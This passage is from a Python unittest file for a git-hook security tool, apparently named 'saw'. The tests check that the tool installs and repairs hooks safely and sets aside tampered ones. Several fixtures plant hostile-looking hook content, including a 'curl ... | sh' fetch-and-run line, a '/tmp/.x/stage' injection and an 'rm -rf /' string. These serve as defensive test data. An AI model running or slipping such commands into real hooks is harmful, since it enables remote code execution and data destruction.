        self.assertEqual(code, 0, text)
        self.assertEqual(list(managed.iterdir()), [])
        kept = _set_aside(self.home)
        self.assertEqual(sorted(Path(json.loads((f / "origin.json").read_text())["path"]).name for f in kept),
                         ["post-checkout.local", "post-merge"])
        self.assertIn("moved aside", text)

    def test_a_link_in_saws_directory_is_moved_aside_even_when_it_points_at_a_hook_saw_installs(self):
        managed = self._managed()
        managed.mkdir(parents=True)
        elsewhere = self.home / "elsewhere"
        elsewhere.write_text(hook.hookscript.render("post-checkout", hook._saw_executable(), None))
        os.chmod(elsewhere, 0o755)
        os.symlink(elsewhere, managed / "post-checkout")
        self.assertEqual(hook.hookscript.verdict(managed / "post-checkout"), hook.hookscript.FOREIGN)
        code, text = self._quiet(hook.install)
        self.assertEqual(code, 0, text)
        self.assertFalse((managed / "post-checkout").is_symlink())
        self.assertEqual(hook.hookscript.verdict(managed / "post-checkout"), hook.hookscript.PRISTINE)
        (kept,) = _set_aside(self.home)
        self.assertTrue((kept / "kept" / "post-checkout").is_symlink())
        self.assertTrue(elsewhere.exists())

    def test_nothing_is_ever_written_through_a_link(self):
        hooks = self.home / "hooks"
        hooks.mkdir()
        elsewhere = self.home / "elsewhere"
        elsewhere.write_text("keep\n")
        os.symlink(elsewhere, hooks / "post-merge")
        self.assertFalse(hook._write_verified(hooks / "post-merge", "new\n", hooks))
        self.assertEqual(elsewhere.read_text(), "keep\n")

    def test_status_says_when_something_is_not_what_saw_installed(self):
        self.assertEqual(self._quiet(hook.install)[0], 0)
        self.assertNotIn("saw hook repair", self._quiet(hook.status)[1])
        (self._managed() / "post-checkout").write_text("#!/bin/sh\n/tmp/.x/stage\n")
        self.assertIn("saw hook repair", self._quiet(hook.status)[1])
        self.assertEqual(self._quiet(hook.repair)[0], 0)
        self.assertNotIn("saw hook repair", self._quiet(hook.status)[1])
        (self._managed() / "post-merge").write_text(hook.hookscript.render("post-merge", str(self.home / "other" / "saw"), None))
        self.assertEqual(hook.hookscript.altered_hooks(), [self._managed() / "post-merge"])
        self.assertIn("saw hook repair", self._quiet(hook.status)[1])


class TestRepair(_Isolated):
    def _quiet(self, fn, *args):
        out = io.StringIO()
        with contextlib.redirect_stdout(out):
            code = fn(*args)
        return code, out.getvalue()

    def _seeded(self, name: str) -> Path:
        repo = _repo({f"{name}.txt": "x\n"})
        self.addCleanup(lambda: __import__("shutil").rmtree(repo, ignore_errors=True))
        cache = self.home / ".cache" / "saw" / "hook-scan-cache.json"
        cache.parent.mkdir(parents=True, exist_ok=True)
        known = json.loads(cache.read_text()) if cache.exists() else {}
        known[str(repo)] = "abc"
        cache.write_text(json.dumps(known))
        return repo

    def test_nothing_seeded_means_nothing_to_repair(self):
        code, text = self._quiet(hook.repair)
        self.assertEqual(code, 0)
        self.assertIn("nothing to repair", text)
        self.assertEqual(_set_aside(self.home), [])

    def test_repair_puts_back_the_hooks_in_every_seeded_repository_and_leaves_their_own(self):
        cfg = self.home / "security.yml"
        cfg.write_text("allowlist: []\n")
        self.assertEqual(self._quiet(hook.install, str(cfg))[0], 0)
        repo = self._seeded("a")
        hooks = repo / ".git" / "hooks"
        for event in ("post-checkout", "post-merge"):
            (hooks / event).write_text(hook.hookscript.render(event, "/usr/local/bin/saw", str(cfg)))
            os.chmod(hooks / event, 0o755)
        altered = hooks / "post-checkout"
        altered.write_text(altered.read_text().replace("exit 0\n", "/tmp/.x/stage\nexit 0\n"))
        theirs = hooks / "post-rewrite"
        theirs.write_text("#!/bin/sh\nnpx lint-staged\n")
        os.chmod(theirs, 0o755)
        chained = hooks / "post-merge.local"
        chained.write_text("#!/bin/sh\necho after\n")
        os.chmod(chained, 0o755)
        managed = self.home / ".config" / "saw" / "git-template" / "hooks"
        (managed / "post-rewrite").write_text("#!/bin/sh\ncurl -s http://127.0.0.1:9/p | sh\n")

        code, text, done = _reporting(hook.repair)
        self.assertEqual(code, 0, text)
        self.assertEqual(hook.hookscript.verdict(altered), hook.hookscript.PRISTINE)
        self.assertIn(f"--config {cfg}", altered.read_text())
        self.assertEqual(theirs.read_text(), "#!/bin/sh\nnpx lint-staged\n")
        self.assertEqual(chained.read_text(), "#!/bin/sh\necho after\n")
        self.assertEqual(hook.hookscript.verdict(managed / "post-rewrite", (hook._saw_executable(), str(cfg))),
                         hook.hookscript.PRISTINE)
        self.assertEqual(len(_set_aside(self.home)), 3)
        self.assertIn((hook.REPAIRED, altered), _states(done))
        self.assertIn((hook.UPDATED, hooks / "post-merge"), _states(done))
        self.assertIn(hook._saw_executable(), (hooks / "post-merge").read_text())
        self.assertIn((hook.LEFT, theirs), _states(done))
        self.assertIn((hook.CHAINED, chained), _states(done))
        self.assertIn((hook.SET_ASIDE, managed / "post-rewrite"), _states(done))

        code, text, done = _reporting(hook.repair)
        self.assertEqual(code, 0, text)
        self.assertEqual(len(_set_aside(self.home)), 3)
        self.assertNotIn(hook.REPAIRED, [a.state for a in done])
        self.assertNotIn(hook.SET_ASIDE, [a.state for a in done])
        self.assertNotIn(hook.UPDATED, [a.state for a in done])

    def test_a_repository_git_cannot_answer_for_withholds_the_all_clear(self):
        self.assertEqual(self._quiet(hook.install)[0], 0)
        repo = self._seeded("b")
        gitdir = self.home / "gitdir"
        gitdir.mkdir()
        __import__("shutil").rmtree(repo / ".git")
        (repo / ".git").write_text(f"gitdir: {gitdir}\n")
        os.chmod(gitdir, 0)
        self.addCleanup(os.chmod, gitdir, 0o700)
        code, text = self._quiet(hook.repair)
        self.assertEqual(code, 3, text)
        self.assertIn(f"git reports an error in {repo}", text)

    def test_a_shared_hooks_directory_is_settled_once(self):
        self.assertEqual(self._quiet(hook.install)[0], 0)
        managed = self.home / ".config" / "saw" / "git-template" / "hooks"
        repo = self._seeded("c")
        _run(repo, "config", "core.hooksPath", str(managed))
        (managed / "post-merge").write_text("#!/bin/sh\n/tmp/.x/stage\n")
        code, text, done = _reporting(hook.repair)
        self.assertEqual(code, 0, text)
        self.assertEqual([a.state for a in done].count(hook.SET_ASIDE), 1)
        self.assertEqual(len(_set_aside(self.home)), 1)
        self.assertEqual([a.path for a in done].count(managed / "post-checkout"), 1, done)


class TestRepairLeavesWhatIsNotSaws(_Isolated):
    def _quiet(self, fn, *args):
        out = io.StringIO()
        with contextlib.redirect_stdout(out):
            code = fn(*args)
        return code, out.getvalue()

    def test_repair_does_not_install_into_a_template_directory_saw_never_installed_into(self):
        self.assertEqual(self._quiet(hook.install)[0], 0)
        theirs_tpl = self.home / "dotfiles-git-template"
        (theirs_tpl / "hooks").mkdir(parents=True)
        theirs = theirs_tpl / "hooks" / "post-checkout"
        theirs.write_text("#!/bin/sh\n. \"$(dirname \"$0\")/_/husky.sh\"\n")
        os.chmod(theirs, 0o755)
        hook.gitutil.run_ok(None, ["config", "--global", "init.templateDir", str(theirs_tpl)], context=hook.gitutil.OPERATOR_CONFIG)
        code, text = self._quiet(hook.repair)
        self.assertEqual(code, 0, text)
        self.assertEqual(theirs.read_text(), "#!/bin/sh\n. \"$(dirname \"$0\")/_/husky.sh\"\n")
        self.assertEqual(sorted(p.name for p in (theirs_tpl / "hooks").iterdir()), ["post-checkout"])
        self.assertNotIn(str(theirs_tpl), text)
        marked = theirs_tpl / "hooks" / "post-merge"
        marked.write_text(hook.hookscript.render("post-merge", str(self.home / "evil" / "saw"), None))
        os.chmod(marked, 0o755)
        code, text, done = _reporting(hook.repair)
        self.assertEqual(code, 0, text)
        self.assertIn((hook.UPDATED, marked), _states(done))
        self.assertEqual(hook.hookscript.verdict(marked, hook.hookscript.installed()), hook.hookscript.PRISTINE)
        self.assertEqual(sorted(p.name for p in (theirs_tpl / "hooks").iterdir()), ["post-checkout", "post-merge"])
        self.assertEqual(theirs.read_text(), "#!/bin/sh\n. \"$(dirname \"$0\")/_/husky.sh\"\n")

    def test_a_directory_that_is_no_longer_a_repository_runs_no_hooks_and_is_not_unreadable(self):
        self.assertEqual(self._quiet(hook.install)[0], 0)
        gone = self.home / "src" / "old"
        gone.mkdir(parents=True)
        (gone / "README").write_text("tarball\n")
        cache = self.home / ".cache" / "saw" / "hook-scan-cache.json"
        cache.parent.mkdir(parents=True, exist_ok=True)
        cache.write_text(json.dumps({str(gone): "abc"}))
        self.assertEqual(hook.hookscript.seeded_repositories(), [])
        code, text = self._quiet(hook.repair)
        self.assertEqual(code, 0, text)
        self.assertNotIn("could not read", text)

    def test_a_hook_git_cannot_run_is_put_back(self):
        self.assertEqual(self._quiet(hook.install)[0], 0)
        managed = self.home / ".config" / "saw" / "git-template" / "hooks"
        crlf = managed / "post-checkout"
        crlf.write_bytes(crlf.read_bytes().replace(b"\n", b"\r\n"))
        self.assertEqual(hook.hookscript.verdict(crlf), hook.hookscript.ALTERED)
        os.chmod(managed / "post-merge", 0o644)
        code, text, done = _reporting(hook.repair)
        self.assertEqual(code, 0, text)
        self.assertNotIn(b"\r", crlf.read_bytes())
        self.assertTrue(os.access(managed / "post-merge", os.X_OK))
        self.assertIn((hook.REPAIRED, crlf), _states(done))
        self.assertIn((hook.UPDATED, managed / "post-merge"), _states(done))

    def test_a_path_is_printed_as_one_plain_line(self):
        managed = self.home / ".config" / "saw" / "git-template" / "hooks"
        managed.mkdir(parents=True)
        forged = managed / "x\n  in place: forged\x1b[32m"
        forged.write_text("payload\n")
        code, text = self._quiet(hook.install)
        self.assertEqual(code, 0, text)
        self.assertNotIn("\n  in place: forged", text)
        self.assertNotIn("\x1b", text)
        self.assertNotIn("payload", text)
        (kept,) = _set_aside(self.home)
        self.assertNotIn("\n", kept.name)
        self.assertNotIn("\x1b", kept.name)
        self.assertEqual(json.loads((kept / "origin.json").read_text())["path"], str(forged))

    def test_a_hooks_path_that_is_saws_own_directory_is_not_a_bypass(self):
        managed = self.home / ".config" / "saw" / "git-template" / "hooks"
        hook.gitutil.run_ok(None, ["config", "--global", "core.hooksPath", str(managed)], context=hook.gitutil.OPERATOR_CONFIG)
        code, text = self._quiet(hook.install)
        self.assertEqual(code, 0, text)
        self.assertNotIn("WON'T run", text)
        self.assertNotIn("WON'T run", self._quiet(hook.status)[1])

    def test_a_hooks_directory_two_seeded_repositories_share_is_settled_once(self):
        self.assertEqual(self._quiet(hook.install)[0], 0)
        main = _repo({"a.txt": "x\n"})
        self.addCleanup(lambda: __import__("shutil").rmtree(main, ignore_errors=True))
        linked = self.home / "proj-feature"
        _run(main, "worktree", "add", "-q", str(linked), "-b", "feature")
        for event in hook._HOOKS:
            (main / ".git" / "hooks" / event).write_text(hook.hookscript.render(event, hook._saw_executable(), None))
            os.chmod(main / ".git" / "hooks" / event, 0o755)
        cache = self.home / ".cache" / "saw" / "hook-scan-cache.json"
        cache.parent.mkdir(parents=True, exist_ok=True)
        cache.write_text(json.dumps({str(main): "abc", str(linked): "abc"}))
        code, text, done = _reporting(hook.repair)
        self.assertEqual(code, 0, text)
        self.assertEqual([a.path.name for a in done].count("post-checkout"), 2, done)
        self.assertNotIn("moved-aside", text)


class TestNothingIsWrittenWhereItShouldNotBe(_Isolated):
    def _quiet(self, fn, *args):
        out = io.StringIO()
        with contextlib.redirect_stdout(out):
            code = fn(*args)
        return code, out.getvalue()

    def _managed(self) -> Path:
        return self.home / ".config" / "saw" / "git-template" / "hooks"

    def test_a_planted_staging_file_cannot_redirect_a_write(self):
        managed = self._managed()
        managed.mkdir(parents=True)
        victim = self.home / "notes.txt"
        victim.write_text("precious\n")
        os.chmod(victim, 0o600)
        os.symlink(victim, managed / "post-checkout.saw-tmp")
        os.symlink(victim, managed / ".saw-planted")
        code, text = self._quiet(hook.install)
        self.assertEqual(code, 0, text)
        self.assertEqual(victim.read_text(), "precious\n")
        self.assertEqual(oct(victim.stat().st_mode & 0o777), oct(0o600))
        for event in hook._HOOKS:
            self.assertFalse((managed / event).is_symlink())
        self.assertEqual(sorted(p.name for p in managed.iterdir()), sorted(hook._HOOKS))
        self.assertEqual(len(_set_aside(self.home)), 2)
        user_tpl = self.home / "my-template"
        (user_tpl / "hooks").mkdir(parents=True)
        os.symlink(victim, user_tpl / "hooks" / "post-merge.saw-tmp")
        hook.gitutil.run_ok(None, ["config", "--global", "init.templateDir", str(user_tpl)], context=hook.gitutil.OPERATOR_CONFIG)
        code, text = self._quiet(hook.install)
        self.assertEqual(code, 0, text)
        self.assertEqual(victim.read_text(), "precious\n")
        self.assertEqual(oct(victim.stat().st_mode & 0o777), oct(0o600))
        self.assertFalse((user_tpl / "hooks" / "post-merge").is_symlink())
        self.assertEqual(hook.hookscript.verdict(user_tpl / "hooks" / "post-merge", hook.hookscript.installed()),
                         hook.hookscript.PRISTINE)

    def test_the_mode_of_a_written_hook_is_set_on_the_open_file_never_by_name(self):
        hooks = self.home / "hooks"
        hooks.mkdir()
        with mock.patch("os.chmod", side_effect=AssertionError("chmod by name")), \
                mock.patch("os.lchmod", side_effect=AssertionError("chmod by name"), create=True):
            self.assertTrue(hook._write_verified(hooks / "post-merge", "#!/bin/sh\n", hooks))
        self.assertTrue(os.access(hooks / "post-merge", os.X_OK))

    def test_a_hook_saw_seeded_that_is_gone_is_restored(self):
        self.assertEqual(self._quiet(hook.install)[0], 0)
        repo = _repo({"a.txt": "x\n"})
        self.addCleanup(lambda: __import__("shutil").rmtree(repo, ignore_errors=True))
        cache = self.home / ".cache" / "saw" / "hook-scan-cache.json"
        cache.parent.mkdir(parents=True, exist_ok=True)
        cache.write_text(json.dumps({str(repo): "abc"}))
        for event in hook._HOOKS:
            (repo / ".git" / "hooks" / event).unlink()
        code, text, done = _reporting(hook.repair)
        self.assertEqual(code, 0, text)
        for event in hook._HOOKS:
            self.assertEqual(hook.hookscript.verdict(repo / ".git" / "hooks" / event, (hook._saw_executable(), None)),
                             hook.hookscript.PRISTINE)
        self.assertIn((hook.RESTORED, repo / ".git" / "hooks" / "post-checkout"), _states(done))
        self.assertEqual(_set_aside(self.home), [])

    def test_uninstall_never_lets_a_chained_hook_overwrite_one_it_could_not_move_aside(self):
        user_tpl = self.home / "my-template"
        (user_tpl / "hooks").mkdir(parents=True)
        theirs = user_tpl / "hooks" / "post-checkout"
        theirs.write_text("#!/bin/sh\necho theirs\n")
        os.chmod(theirs, 0o755)
        hook.gitutil.run_ok(None, ["config", "--global", "init.templateDir", str(user_tpl)], context=hook.gitutil.OPERATOR_CONFIG)
        self.assertEqual(self._quiet(hook.install)[0], 0)
        altered = theirs.read_text().replace("exit 0\n", "/tmp/.x/stage\nexit 0\n")
        theirs.write_text(altered)
        root = hook.hookscript.set_aside_dir()
        root.parent.mkdir(parents=True)
        root.write_text("not a directory\n")
        code, text = self._quiet(hook.uninstall)
        self.assertEqual(code, 3, text)
        self.assertEqual(theirs.read_text(), altered)
        self.assertEqual((user_tpl / "hooks" / "post-checkout.local").read_text(), "#!/bin/sh\necho theirs\n")

    def test_a_pipe_named_like_a_hook_is_never_opened(self):
        managed = self._managed()
        managed.mkdir(parents=True)
        os.mkfifo(managed / "post-checkout")
        self.assertEqual(hook.hookscript.verdict(managed / "post-checkout"), hook.hookscript.FOREIGN)
        self.assertFalse(hook.hookscript.is_ours(managed / "post-checkout"))
        self.assertEqual(hook.hookscript.altered_hooks(), [managed / "post-checkout"])
        code, text = self._quiet(hook.status)
        self.assertEqual(code, 0)
        self.assertIn("saw hook repair", text)

    def test_a_linked_hooks_directory_is_refused_whole(self):
        elsewhere = self.home / "Documents"
        elsewhere.mkdir()
        (elsewhere / "thesis.txt").write_text("years\n")
        (self.home / ".config" / "saw" / "git-template").mkdir(parents=True)
        os.symlink(elsewhere, self._managed())
        code, text = self._quiet(hook.install)
        self.assertEqual(code, 3, text)
        self.assertIn("could be put in place", text)
        self.assertEqual((elsewhere / "thesis.txt").read_text(), "years\n")
        self.assertEqual(sorted(p.name for p in elsewhere.iterdir()), ["thesis.txt"])
        self.assertEqual(_set_aside(self.home), [])

    def test_a_linked_hook_of_the_operators_is_chained_without_touching_its_target(self):
        user_tpl = self.home / "my-template"
        (user_tpl / "hooks").mkdir(parents=True)
        key = self.home / "id_rsa"
        key.write_text("SECRET\n")
        os.chmod(key, 0o600)
        os.symlink(key, user_tpl / "hooks" / "post-checkout")
        hook.gitutil.run_ok(None, ["config", "--global", "init.templateDir", str(user_tpl)], context=hook.gitutil.OPERATOR_CONFIG)
        code, text = self._quiet(hook.install)
        self.assertEqual(code, 0, text)
        self.assertEqual(oct(key.stat().st_mode & 0o777), oct(0o600))
        self.assertEqual(key.read_text(), "SECRET\n")
        self.assertTrue((user_tpl / "hooks" / "post-checkout.local").is_symlink())

    def test_an_unreadable_hooks_directory_ends_with_a_verdict_not_a_traceback(self):
        managed = self._managed()
        managed.mkdir(parents=True)
        os.chmod(managed, 0)
        self.addCleanup(os.chmod, managed, 0o700)
        err = io.StringIO()
        with contextlib.redirect_stderr(err):
            code, text = self._quiet(hook.install)
        self.assertEqual(code, 3, text + err.getvalue())
        self.assertNotIn("Traceback", err.getvalue())
        hook.hookscript.declare(hook._saw_executable(), None)
        err = io.StringIO()
        with contextlib.redirect_stderr(err):
            code, text = self._quiet(hook.repair)
        self.assertEqual(code, 3, text + err.getvalue())
        self.assertNotIn("Traceback", err.getvalue())

    def test_install_records_what_it_installed_and_repair_refuses_to_guess(self):
        cfg = self.home / "security.yml"
        cfg.write_text("allowlist: []\n")
        self.assertEqual(self._quiet(hook.install, str(cfg))[0], 0)
        self.assertEqual(hook.hookscript.installed(), (hook._saw_executable(), str(cfg)))
        hook.hookscript.declaration_path().unlink()
        err = io.StringIO()
        with contextlib.redirect_stderr(err):
            code, text = self._quiet(hook.repair)
        self.assertEqual(code, 2)
        self.assertIn("saw hook install", err.getvalue())
        self.assertEqual(self._quiet(hook.install, str(cfg))[0], 0)
        self.assertEqual(self._quiet(hook.uninstall)[0], 0)
        self.assertIsNone(hook.hookscript.installed())
        self.assertFalse(hook.hookscript.cache_path().exists())

    def test_a_hook_of_yours_that_mentions_saw_is_yours(self):
        self.assertEqual(self._quiet(hook.install)[0], 0)
        repo = _repo({"a.txt": "x\n"})
        self.addCleanup(lambda: __import__("shutil").rmtree(repo, ignore_errors=True))
        mine = repo / ".git" / "hooks" / "pre-push"
        mine.write_text(f"#!/bin/sh\n# copied from {hook._MARKER}, adapted by me\necho mine\n")
        os.chmod(mine, 0o755)
        cache = self.home / ".cache" / "saw" / "hook-scan-cache.json"
        cache.parent.mkdir(parents=True, exist_ok=True)
        cache.write_text(json.dumps({str(repo): "abc"}))
        self.assertEqual(hook.hookscript.verdict(mine), hook.hookscript.FOREIGN)
        self.assertEqual(hook.hookscript.altered_hooks(), [])
        header = hook.hookscript.render("post-merge", "/x/saw", None).splitlines()[1]
        self.assertTrue(hook.hookscript.claims_ours(header + "\nrm -rf /\n"))

    def test_what_is_moved_aside_is_said_without_where_it_was(self):
        deep = self._managed()
        for i in range(12):
            deep = deep / f"a-very-long-directory-name-number-{i:02d}-padding-padding"
        deep.mkdir(parents=True)
        (deep / "stray").write_text("x\n")
        self.assertGreater(len(str(deep / "stray")), 300)
        with mock.patch("stayawake.bots.security.hookscript.hooks_dir", return_value=deep), \
                mock.patch("stayawake.bots.security.hook._hooks_dir", return_value=deep):
            code, text = self._quiet(hook.install)
        self.assertIn("moved aside", text)
        self.assertNotIn("a-very-long-directory-name", text)


class TestRepairPutsBackOnlyWhatSawSeeded(_Isolated):
    def _quiet(self, fn, *args):
        out = io.StringIO()
        with contextlib.redirect_stdout(out):
            code = fn(*args)
        return code, out.getvalue()

    def _seed(self, repo: Path) -> None:
        cache = self.home / ".cache" / "saw" / "hook-scan-cache.json"
        cache.parent.mkdir(parents=True, exist_ok=True)
        known = json.loads(cache.read_text()) if cache.exists() else {}
        known[str(repo)] = "abc"
        cache.write_text(json.dumps(known))

    def test_a_repository_whose_hooks_path_runs_elsewhere_gets_nothing_written(self):
        self.assertEqual(self._quiet(hook.install)[0], 0)
        repo = _repo({"a.txt": "x\n"})
        self.addCleanup(lambda: __import__("shutil").rmtree(repo, ignore_errors=True))
        (repo / ".husky").mkdir()
        (repo / ".husky" / "pre-commit").write_text("#!/bin/sh\nnpx lint-staged\n")
        _run(repo, "config", "core.hooksPath", ".husky")
        _run(repo, "add", "-A")
        _run(repo, "commit", "-qm", "husky")
        self._seed(repo)
        code, text, done = _reporting(hook.repair)
        self.assertEqual(code, 0, text)
        self.assertEqual(sorted(p.name for p in (repo / ".husky").iterdir()), ["pre-commit"])
        self.assertEqual(subprocess.run(["git", "-C", str(repo), "status", "--porcelain"],
                                        capture_output=True, text=True).stdout, "")
        self.assertIn((hook.LEFT, repo), _states(done))
        _run(repo, "config", "core.hooksPath", "/dev/null")
        code, text, done = _reporting(hook.repair)
        self.assertEqual(code, 0, text)
        self.assertNotIn(hook.UNVERIFIED, [a.state for a in done])

    def test_a_removed_hooks_directory_is_seeded_again(self):
        self.assertEqual(self._quiet(hook.install)[0], 0)
        repo = _repo({"a.txt": "x\n"})
        self.addCleanup(lambda: __import__("shutil").rmtree(repo, ignore_errors=True))
        __import__("shutil").rmtree(repo / ".git" / "hooks")
        self._seed(repo)
        code, text, done = _reporting(hook.repair)
        self.assertEqual(code, 0, text)
        self.assertIn(hook.RESTORED, [a.state for a in done])
        self.assertEqual(sorted(p.name for p in (repo / ".git" / "hooks").iterdir()), sorted(hook._HOOKS))

    def test_repair_puts_back_the_saw_that_was_recorded_not_the_one_in_the_path(self):
        self.assertEqual(self._quiet(hook.install)[0], 0)
        recorded = hook.hookscript.installed()
        other = self.home / "bin" / "saw"
        other.parent.mkdir()
        other.write_text("#!/bin/sh\n")
        os.chmod(other, 0o755)
        with mock.patch("stayawake.bots.security.hook._saw_executable", return_value=str(other)):
            code, text, done = _reporting(hook.repair)
        self.assertEqual(code, 0, text)
        self.assertNotIn(hook.UPDATED, [a.state for a in done])
        self.assertEqual(_set_aside(self.home), [])
        self.assertEqual(hook.hookscript.installed(), recorded)
        gone = self.home / "gone" / "saw"
        hook.hookscript.declaration_path().write_text(json.dumps({"saw": str(gone), "config": None}))
        for event in hook._HOOKS:
            (hook._hooks_dir() / event).write_text(hook.hookscript.render(event, str(gone), None))
        code, text, done = _reporting(hook.repair)
        self.assertEqual(code, 0, text)
        self.assertEqual([a.state for a in done].count(hook.UPDATED), len(hook._HOOKS))
        self.assertIn(hook._saw_executable(), (hook._hooks_dir() / "post-merge").read_text())

    def test_a_recorded_config_that_is_gone_stops_repair_and_status_says_so(self):
        cfg = self.home / "security.yml"
        cfg.write_text("allowlist: []\n")
        self.assertEqual(self._quiet(hook.install, str(cfg))[0], 0)
        cfg.unlink()
        err = io.StringIO()
        with contextlib.redirect_stderr(err):
            code, text = self._quiet(hook.repair)
        self.assertEqual(code, 2)
        self.assertIn("the config your hooks scan with is gone", err.getvalue())
        self.assertNotIn(str(cfg), err.getvalue())
        err = io.StringIO()
        with contextlib.redirect_stderr(err):
            shown = self._quiet(hook.status)[1]
        self.assertIn("the config your hooks scan with is gone", shown)
        self.assertNotIn(str(cfg), shown + err.getvalue())
        self.assertIn(str(cfg), (hook._hooks_dir() / "post-merge").read_text())

    def test_without_a_record_a_hook_naming_another_config_is_not_an_alarm(self):
        managed = self.home / ".config" / "saw" / "git-template" / "hooks"
        managed.mkdir(parents=True)
        for event in hook._HOOKS:
            p = managed / event
            p.write_text(hook.hookscript.render(event, hook._saw_executable(), str(self.home / "old.yml")))
            os.chmod(p, 0o755)
        hook.gitutil.run_ok(None, ["config", "--global", "init.templateDir", str(managed.parent)], context=hook.gitutil.OPERATOR_CONFIG)
        self.assertIsNone(hook.hookscript.installed())
        self.assertEqual(hook.hookscript.altered_hooks(), [])
        text = self._quiet(hook.status)[1]
        self.assertIn("no record", text)
        self.assertNotIn("not what saw installs", text)
        (managed / "post-merge").write_text("#!/bin/sh\n/tmp/.x/stage\n")
        self.assertEqual(hook.hookscript.altered_hooks(), [managed / "post-merge"])


class TestTheRecordIsTheOnlyAuthority(_Isolated):
    def _quiet(self, fn, *args):
        out = io.StringIO()
        with contextlib.redirect_stdout(out):
            code = fn(*args)
        return code, out.getvalue()

    def _managed(self) -> Path:
        return self.home / ".config" / "saw" / "git-template" / "hooks"

    def _seed(self, repo: Path) -> None:
        cache = self.home / ".cache" / "saw" / "hook-scan-cache.json"
        cache.parent.mkdir(parents=True, exist_ok=True)
        cache.write_text(json.dumps({str(repo): "abc"}))

    def test_a_repository_whose_git_directory_is_a_link_gets_nothing_written(self):
        self.assertEqual(self._quiet(hook.install)[0], 0)
        victim = _repo({"v.txt": "x\n"})
        self.addCleanup(lambda: __import__("shutil").rmtree(victim, ignore_errors=True))
        for event in hook._HOOKS:
            (victim / ".git" / "hooks" / event).unlink(missing_ok=True)
        decoy = self.home / "decoy"
        decoy.mkdir()
        os.symlink(victim / ".git", decoy / ".git")
        self._seed(decoy)
        code, text = self._quiet(hook.repair)
        self.assertEqual(code, 3, text)
        self.assertIn("could be put in place", text)
        self.assertEqual([e for e in hook._HOOKS if (victim / ".git" / "hooks" / e).exists()], [])

    def test_a_same_name_of_another_case_is_never_counted_as_the_hook(self):
        managed = self._managed()
        managed.mkdir(parents=True)
        odd = managed / "Post-Checkout"
        odd.write_text(hook.hookscript.render("post-checkout", hook._saw_executable(), None))
        os.chmod(odd, 0o755)
        if not (managed / "post-checkout").exists():
            self.skipTest("this filesystem tells the two names apart")
        code, text = self._quiet(hook.install)
        self.assertEqual(code, 0, text)
        self.assertIn("post-checkout", os.listdir(managed))
        self.assertNotIn("Post-Checkout", os.listdir(managed))
        self.assertEqual(hook.hookscript.verdict(managed / "post-checkout", hook.hookscript.installed()),
                         hook.hookscript.PRISTINE)
        self.assertEqual(len(_set_aside(self.home)), 1)

    def test_a_hook_of_saws_own_that_is_gone_is_reported(self):
        self.assertEqual(self._quiet(hook.install)[0], 0)
        (self._managed() / "post-checkout").unlink()
        self.assertEqual(hook.hookscript.altered_hooks(), [self._managed() / "post-checkout"])
        self.assertIn("saw hook repair", self._quiet(hook.status)[1])
        code, text = self._quiet(hook.repair)
        self.assertEqual(code, 0, text)
        self.assertEqual(hook.hookscript.altered_hooks(), [])

    def test_a_recorded_saw_that_cannot_run_is_reported(self):
        mine = self.home / "bin" / "saw"
        mine.parent.mkdir()
        mine.write_text("#!/bin/sh\n")
        os.chmod(mine, 0o755)
        with mock.patch("stayawake.bots.security.hook._saw_executable", return_value=str(mine)):
            self.assertEqual(self._quiet(hook.install)[0], 0)
        self.assertTrue(hook.hookscript.recorded_saw_runs())
        self.assertNotIn("cannot run", self._quiet(hook.status)[1])
        os.chmod(mine, 0o644)
        self.assertFalse(hook.hookscript.recorded_saw_runs())
        self.assertIn("cannot run", self._quiet(hook.status)[1])
        mine.unlink()
        self.assertFalse(hook.hookscript.recorded_saw_runs())
        code, text = self._quiet(hook.repair)
        self.assertEqual(code, 0, text)
        self.assertTrue(hook.hookscript.recorded_saw_runs())

    def test_a_link_to_nothing_is_never_chained(self):
        user_tpl = self.home / "my-template"
        (user_tpl / "hooks").mkdir(parents=True)
        os.symlink("post-merge", user_tpl / "hooks" / "post-merge")
        hook.gitutil.run_ok(None, ["config", "--global", "init.templateDir", str(user_tpl)], context=hook.gitutil.OPERATOR_CONFIG)
        code, text = self._quiet(hook.install)
        self.assertEqual(code, 0, text)
        self.assertFalse(os.path.lexists(user_tpl / "hooks" / "post-merge.local"))
        self.assertEqual(hook.hookscript.verdict(user_tpl / "hooks" / "post-merge", hook.hookscript.installed()),
                         hook.hookscript.PRISTINE)
        (kept,) = _set_aside(self.home)
        self.assertTrue((kept / "kept" / "post-merge").is_symlink())

    def test_repair_settles_the_template_directory_the_record_names_and_no_other(self):
        user_tpl = self.home / "my-template"
        (user_tpl / "hooks").mkdir(parents=True)
        hook.gitutil.run_ok(None, ["config", "--global", "init.templateDir", str(user_tpl)], context=hook.gitutil.OPERATOR_CONFIG)
        self.assertEqual(self._quiet(hook.install)[0], 0)
        self.assertEqual(hook.hookscript.installed_into(), user_tpl / "hooks")
        other = self.home / "other-template"
        (other / "hooks").mkdir(parents=True)
        planted = other / "hooks" / "post-checkout"
        planted.write_text(hook.hookscript.render("post-checkout", str(self.home / "evil" / "saw"), None))
        os.chmod(planted, 0o755)
        theirs = other / "hooks" / "post-merge"
        theirs.write_text("#!/bin/sh\necho theirs\n")
        os.chmod(theirs, 0o755)
        hook.gitutil.run_ok(None, ["config", "--global", "init.templateDir", str(other)], context=hook.gitutil.OPERATOR_CONFIG)
        code, text, done = _reporting(hook.repair)
        self.assertEqual(code, 0, text)
        self.assertIn((hook.UPDATED, planted), _states(done))
        self.assertNotIn(str(self.home / "evil" / "saw"), planted.read_text())
        self.assertEqual(theirs.read_text(), "#!/bin/sh\necho theirs\n")
        self.assertEqual(sorted(p.name for p in (other / "hooks").iterdir()), ["post-checkout", "post-merge"])
        altered = user_tpl / "hooks" / "post-merge"
        altered.write_text(altered.read_text().replace("exit 0\n", "/tmp/.x/stage\nexit 0\n"))
        code, text, done = _reporting(hook.repair)
        self.assertEqual(code, 0, text)
        self.assertIn((hook.REPAIRED, altered), _states(done))

    def test_install_always_sweeps_saws_own_directory(self):
        user_tpl = self.home / "my-template"
        (user_tpl / "hooks").mkdir(parents=True)
        hook.gitutil.run_ok(None, ["config", "--global", "init.templateDir", str(user_tpl)], context=hook.gitutil.OPERATOR_CONFIG)
        managed = self._managed()
        managed.mkdir(parents=True)
        planted = managed / "post-checkout.local"
        planted.write_text("#!/bin/sh\n/tmp/.x/stage\n")
        code, text, done = _reporting(hook.install)
        self.assertEqual(code, 0, text)
        self.assertFalse(planted.exists())
        self.assertIn((hook.SET_ASIDE, planted), _states(done))

    def test_uninstall_keeps_a_stale_hook_aside(self):
        self.assertEqual(self._quiet(hook.install)[0], 0)
        stale = self._managed() / "post-merge"
